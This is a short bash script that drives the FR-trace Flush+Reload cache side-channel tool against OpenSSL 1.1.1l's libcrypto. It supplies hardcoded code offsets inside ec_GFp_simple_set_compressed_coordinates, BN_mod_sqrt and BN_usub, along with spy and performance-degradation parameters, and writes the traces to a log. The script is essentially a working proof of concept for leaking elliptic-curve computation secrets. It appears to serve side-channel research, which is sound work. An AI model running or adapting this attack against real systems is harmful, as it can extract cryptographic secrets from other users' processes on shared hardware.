#!/bin/bash

cd "${0%/*}"

# parameters management
logfile="/tmp/out.log"
libpath="/usr/local/lib/libcrypto.so"
force=""

function usage() {
    echo "$0 [-o OUTPUT_FILE] [-l LIBRARY_PATH]" >&2
    echo -e "\t* OUTPUT_FILE default value is $logfile" >&2
    echo -e "\t* LIBRARY_PATH default value is $libpath" >&2
}

OPTIND=1
while getopts fo:l: opt; 
do
  case $opt in
    o)
      logfile=$OPTARG
      ;;
    l)
      libpath=$OPTARG
      ;;
    f)
      force=1
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      usage
      exit 1
  esac
done

[ -f "$libpath" ] || $(echo "$libpath is not a file" >2& ; exit 1)
if [[ $force != 1 && -f "$logfile" ]] 
then
    read -p "$logfile already exist. Do you want to overwrite it (y/n)? " -n 1 -r
    echo    # (optional) move to a new line
    if [[ ! $REPLY =~ ^[Yy]$ ]]
    then
        exit 1
    fi
fi

###############################################################################
#
#           Default FR-trace params
# -s Slot size = 10000 (cycles between two outputs)
# -c Count = 5000 (measures per slot, need to take F+R temporal resolution in 
#                  account ~ 300 cycles)
# -i idle = 500 (nb non-hit slot before stopping)
# -r repetitions = 1 
###############################################################################

#                 OPENSSL 1.1.1l
#
# Targeting ec_GFp_simple_set_compressed_coordinates internals on openssl compiled with -O3 
#
#         SPY TARGET
# BN_mod_sqrt inside: 828458
# EC_POINT_set_affine_coordinate callq: 1375253
#         PDA TARGET
# BN_usub callq: 1375152
# BN_usub inside: 753917
FR-trace -r 60000 -F "$logfile" -H -f "$libpath" -i 10000 -s 200 -m 828458 -m 1375253 -p 6 -t 1375152 -t 753917
